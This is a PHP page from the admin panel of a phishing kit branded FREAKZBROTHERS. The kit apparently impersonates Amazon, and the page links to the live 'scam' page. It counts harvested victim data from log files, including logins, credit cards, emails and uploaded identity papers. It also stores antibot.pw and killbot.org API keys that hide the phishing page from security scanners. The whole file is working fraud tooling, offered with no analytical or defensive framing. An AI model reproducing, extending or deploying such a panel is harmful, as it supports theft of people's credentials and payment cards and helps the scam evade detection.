<?php
error_reporting(0);
session_start();
date_default_timezone_set("Asia/Jakarta");
include '../main.php';
if (!isset($_SESSION['user'])) {
	header("location: login.php");
}
function fb_count($filename) {
	$file = fopen($filename, "r");
	$total_click = fread($file, filesize($filename));
	$total_click = substr_count($total_click, "\n");
	return $total_click;
	fclose($file);
}
$total_click = fb_count("../log/clicker.txt");
$total_login = fb_count("../log/login.txt");
$total_cc = fb_count("../log/cc.txt");
$total_bot = fb_count("../log/total_bot.txt");
$total_upload = fb_count("../log/papid.txt");
$total_email = fb_count("../log/email.txt");
if (isset($_POST['antibot'])) {
  unlink("../antibot.ini");
  $freakz = fopen("../antibot.ini", "a");
  fwrite($freakz, $_POST['antibotkey']."\n");
  fclose($freakz);
}
if (isset($_POST['killbot'])) {
  unlink("../killbot.ini");
  $freakz = fopen("../killbot.ini", "a");
  fwrite($freakz, $_POST['killbotkey']."\n");
  fclose($freakz);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <link rel="apple-touch-icon" sizes="76x76" href="img/apple-icon.png">
  <link rel="icon" type="image/png" href="img/favicon.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title>FREAKZBROTHERS - PANEL</title>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700,200" rel="stylesheet" />
  <script src="https://kit.fontawesome.com/a2ddabd525.js" crossorigin="anonymous"></script>
  <link href="css/bootstrap.min.css" rel="stylesheet" />
  <link href="css/paper-dashboard.css?v=2.0.0" rel="stylesheet" />
  <link href="demo/demo.css" rel="stylesheet" />
</head>

<body class="">
  <div class="wrapper ">
    <div class="sidebar" data-color="black" data-active-color="danger">
      <div class="logo">
        <a href="#" class="simple-text logo-mini">
            <font style="font-size:32px;"><i class="fab fa-amazon"></i></font>
        </a>
        <a href="index.php" class="simple-text logo-normal">
          <strong>FREAKZBROTHERS</strong>
        </a>
      </div>
      <div class="sidebar-wrapper">
        <ul class="nav">
          <li>
            <a href="index.php">
              <i class="fas fa-chart-bar"></i>
              <p>Statistic</p>
            </a>
          </li>
          <li>
            <a href="setting.php">
              <i class="fas fa-cogs"></i>
              <p>Settings</p>
            </a>
          </li>
          <li class="active ">
            <a href="antibot.php">
              <i class="fas fa-robot"></i>
              <p>Antibot</p>
            </a>
          </li>
          <li>
            <a href="reset.php">
              <i class="fas fa-trash-alt"></i>
              <p>Reset Logs</p>
            </a>
          </li>
          <li>
            <a href="logout.php">
              <i class="fas fa-sign-out-alt"></i>
              <p>Log Out</p>
            </a>
          </li>
        </ul>
      </div>
    </div>
    <div class="main-panel">
      <!-- Navbar -->
      <nav class="navbar navbar-expand-lg navbar-absolute fixed-top navbar-transparent">
        <div class="container-fluid">
          <div class="navbar-wrapper">
            <div class="navbar-toggle">
              <button type="button" class="navbar-toggler">
              </button>
            </div>
            <a class="navbar-brand" href="#"><strong><font style="font-family:tahoma;">ANTIBOT</font></strong></a>
          </div>
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-controls="navigation-index" aria-expanded="false" aria-label="Toggle navigation">
          </button>
          <div class="collapse navbar-collapse justify-content-end" id="navigation">
            <ul class="navbar-nav">
              <li class="nav-item">
                <a class="nav-link btn-rotate" href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $parameter ?>">
                  <p><strong>[ VIEW SCAM ]</strong></p>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </nav>
      <div class="content">
        <div class="row">
          <div class="col-md-12">
            <div class="card ">
              <div class="card-header ">
                <h5 class="card-title"><strong>ANTIBOT SETTING</strong></h5>
              </div>
              <div class="card-body ">
                <form action="" method="post" class="form-horizontal">
                <table class="table">
                  <thead class="text-danger">
                    <tr>
                      <td><strong>NEW API KEY</strong></td>
                      <td><strong>OLD API KEY</strong></td>
                      <td><strong>ACTIONS</strong></td>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td><div class="col-md-8"><input type="text" name="antibotkey" class="form-control" placeholder="Paste your antibot.pw key here"></div></td>
                      <td><div class="col-md-8"><input type="text" class="form-control" readonly value="<?= file_get_contents("../antibot.ini") ?>"></div></td>
                      <td><button type="submit" name="antibot" class="btn btn-danger"><i class="fa fa-check"></i>&nbsp;&nbsp;&nbsp;UPDATE</button></td>
                    </tr>
                    <tr>
                      <td><div class="col-md-8"><input type="text" name="killbotkey" class="form-control" placeholder="Paste your killbot.org API key here"></div></td>
                      <td><div class="col-md-8"><input type="text" class="form-control" readonly value="<?= file_get_contents("../killbot.ini") ?>"></div></td>
                      <td><button type="submit" name="killbot" class="btn btn-danger"><i class="fa fa-check"></i>&nbsp;&nbsp;&nbsp;UPDATE</button></td>
                    </tr>
                  </tbody>
                </table><br>
                <span class="help-block">If your enter API key, Antibot.pw automatically active</span>
              </div>
              <div class="card-footer ">
              </div>
            </div>
          </div>
        </div>
        <div class="row">
        </div>
      </div>
      <footer class="footer footer-black  footer-white ">
        <div class="container-fluid">
          <div class="row">
            <div class="credits ml-auto">
              <span class="copyright">
                ©
                <script>
                  document.write(new Date().getFullYear())
                </script>, made with <i class="fa fa-heart heart"></i> by FREAKZBROTHERS
              </span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </div>
  <!--   Core JS Files   -->
  <script src="js/core/jquery.min.js"></script>
  <script src="js/core/popper.min.js"></script>
  <script src="js/core/bootstrap.min.js"></script>
  <script src="js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <!--  Google Maps Plugin    -->
  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE"></script>
  <!-- Chart JS -->
  <script src="js/plugins/chartjs.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Now Ui Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="js/paper-dashboard.min.js?v=2.0.0" type="text/javascript"></script>
  <!-- Paper Dashboard DEMO methods, don't include it in your project! -->
  <script src="demo/demo.js"></script>
  <script>
    $(document).ready(function() {
      // Javascript method's body can be found in assets/assets-for-demo/js/demo.js
      demo.initChartsPages();
    });
  </script>
</body>

</html>
